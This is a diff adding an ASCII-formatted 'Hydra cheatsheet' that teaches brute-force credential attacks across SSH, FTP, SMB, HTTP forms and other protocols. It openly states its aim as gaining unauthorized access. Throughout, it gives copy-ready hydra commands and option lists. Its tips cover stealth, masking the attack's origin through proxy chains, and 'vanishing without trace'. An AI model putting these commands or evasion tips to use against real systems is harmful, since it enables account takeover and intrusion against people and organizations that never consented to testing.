@@ -1,0 +1,81 @@
+┌───────────────────────────────────────────────────────────────┐
+│                      ZYA'S HYDRA CHEATSHEET                   │
+│                      TACTICAL GUIDE                           │
+└───────────────────────────────────────────────────────────────┘
+
+MISSION:
+Perform rapid, parallelized brute-force attacks against various protocols
+to discover valid credentials and gain unauthorized access.
+
+───────────────────────────────
+QUICK DEPLOYMENT PROTOCOL
+───────────────────────────────
+1️⃣ Define target IP/hostname and service (protocol).  
+2️⃣ Prepare username and password lists (wordlists).  
+3️⃣ Select appropriate module for the protocol (ssh, ftp, http, smb...).  
+4️⃣ Launch hydra specifying protocol, user, pass lists, and target.  
+5️⃣ Monitor output for successful authentication attempts.  
+6️⃣ Use results for further exploitation or pivoting.
+
+───────────────────────────────
+COMMON PROTOCOL MODULES
+───────────────────────────────
+- ssh  
+- ftp  
+- http-get / http-post-form  
+- smb  
+- smtp  
+- telnet  
+- rdp  
+- mysql  
+- postgres  
+- vnc  
+
+───────────────────────────────
+BASIC COMMAND STRUCTURE
+───────────────────────────────
+`hydra -L users.txt -P passwords.txt <target> <protocol>`
+
+───────────────────────────────
+EXAMPLES
+───────────────────────────────
+- SSH brute force:  
+  `hydra -L users.txt -P passwords.txt ssh://192.168.1.10`
+
+- FTP brute force:  
+  `hydra -l admin -P passwords.txt ftp://192.168.1.20`
+
+- HTTP POST form brute force:  
+  `hydra -L users.txt -P passwords.txt <target> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`
+
+- SMB login brute force:  
+  `hydra -L users.txt -P passwords.txt smb://192.168.1.30`
+
+───────────────────────────────
+KEY OPTIONS
+───────────────────────────────
+- `-L <file>` — Username list file.  
+- `-l <user>` — Single username.  
+- `-P <file>` — Password list file.  
+- `-p <pass>` — Single password.  
+- `-t <tasks>` — Number of parallel tasks (threads).  
+- `-f` — Exit after first valid login found.  
+- `-V` — Verbose mode, show all attempts.  
+- `-s <port>` — Specify port if non-standard.  
+- `-o <file>` — Output file for results.  
+- `-e nsr` — Additional checks (n=none, s=try blank, r=try reversed).  
+
+───────────────────────────────
+TACTICAL TIPS
+───────────────────────────────
+- Use targeted, curated user/pass lists to increase success rates.  
+- Adjust thread count to balance speed and stealth.  
+- Avoid noisy or too-fast attacks in sensitive environments.  
+- Use verbose mode for detailed feedback during testing.  
+- Combine with proxy chains or VPNs to obfuscate origin.  
+- Capture and analyze failed attempts to refine wordlists.
+
+───────────────────────────────
+FINAL COMMANDMENT:
+“Crack credentials relentlessly, exploit access swiftly, and vanish without trace.”
+───────────────────────────────
